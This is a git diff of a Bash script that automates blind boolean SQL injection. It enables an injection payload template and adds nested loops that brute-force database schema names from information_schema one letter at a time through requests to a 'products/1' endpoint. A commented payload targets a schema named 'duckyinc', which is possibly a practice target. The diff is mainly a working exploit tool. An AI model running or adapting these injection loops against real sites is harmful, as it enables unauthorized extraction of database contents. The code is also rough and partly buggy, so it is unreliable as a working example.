@@ -8,7 +8,7 @@ function enumarteViaNumber() {
   	[ $index -le 100 ]
 }
 
-function enumarteViaalphabet() {
+function enumarteViaAlphabet() {
 	aplphabet='abcdefghijklmnopqrstuvwxyz'
         ((y++))
 	echo $aplphabet[0]
@@ -22,10 +22,9 @@ function loopThrow() {
 	START=1
 	END=100
 	placeholderSqli="$1"
-	#loop_condition=(( index=$START; index<=$END; index++ ))
 
 	while "${object['condition']}"; do
-		#sqli="$(printf "${placeholderSqli}" "$index")"
+		sqli="$(printf "${placeholderSqli}" "$index")"
 		request "$sqli"
                 result=$(echo $?)
                 if [ $result -eq 0 ]; then
@@ -48,8 +47,10 @@ function getLength() {
 	END_Y=$((object['amountOfDatabases']))
 	results=''
 	sqlQuery="$1"
-	#object['condition']='enumarteViaNumber'
-	object['condition']='enumarteViaalphabet'
+	object['condition']='enumarteViaNumber'
+
+
+	#object['condition']='enumarteViaAlphabet'
 
 	for (( indey=$START_Y; indey<=$END_Y; indey++)); do
 		count=$((indey-1))
@@ -92,6 +93,7 @@ function getAmount() {
 }
 
 function bruteForceName() {
+	#  sqli="and (SELECT substr(LOWER(table_name), $index,1) FROM information_schema.tables WHERE table_schema = 'duckyinc' LIMIT 1 OFFSET $offset) = '$letter'"
 	echo "i will get the name"
 	# required:
 	# - length
@@ -99,13 +101,40 @@ function bruteForceName() {
 	# - database/table/columns
 	# sqli
 
+	#1 many of databases = 5
+	#-> loop 5 times
+	#2 the length of the word 1 = 10
+	# -> second loop
+	# 3 inside the loop from 2 check if alphabet is equql
 
-	#for index in $(seq 1 $length); do
-	#	for letter in {a..z} do
-	#		echo ''
-	#		#request $encodedUrl
-	#	done
-	#done
+	sqlQuery=$1
+	#SELECT substr(LOWER(DATABASE()), %d,1)
+	placeholderSqli="AND (${sqlQuery}) = '%s'"
+
+	length=$((object['amountOfDatabases']))
+	databaseNameLength=(${object['lengthOfDatabaseNames']})
+	#'SELECT substr(LOWER(DATABASE()), $index,1)
+	list=()
+
+	for (( index=0; index<=$((length-1)); index++ )); do
+		limit="${databaseNameLength[$index]}"
+		name=''
+		for (( i=0; i<=$limit; i++ )); do
+			number=$((i+1))
+			offset=$index
+			for letter in {{a..z},_}; do
+				sqli="$(printf "${placeholderSqli}" "$number" "$offset" "$letter")"
+				request "${sqli}"
+				result=$(echo $?)
+				if [ $result -eq 0 ]; then
+                       			name="${name}${letter}"
+                        		break
+                		fi
+			done
+		done
+		echo "$name"
+		list+="${name}"
+	done
 }
 
 function request() {
@@ -137,5 +166,9 @@ PATH="products/1"
 # es sind 5 databases drinne!
 object['amountOfDatabases']='5'
 #object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
-getLength 'SELECT length(schema_name) FROM information_schema.schemata'
-echo "${object['lengthOfDatabaseNames']}"
+object['lengthOfDatabaseNames']=$(getLength 'SELECT length(schema_name) FROM information_schema.schemata')
+
+# get Database name
+echo "database names => ${object['lengthOfDatabaseNames']}"
+bruteForceName 'SELECT substr(LOWER(schema_name), %d,1) FROM information_schema.schemata LIMIT 1 OFFSET %d'
+#bruteForceName '(SELECT substr(DATABASE(),1,1)) = '
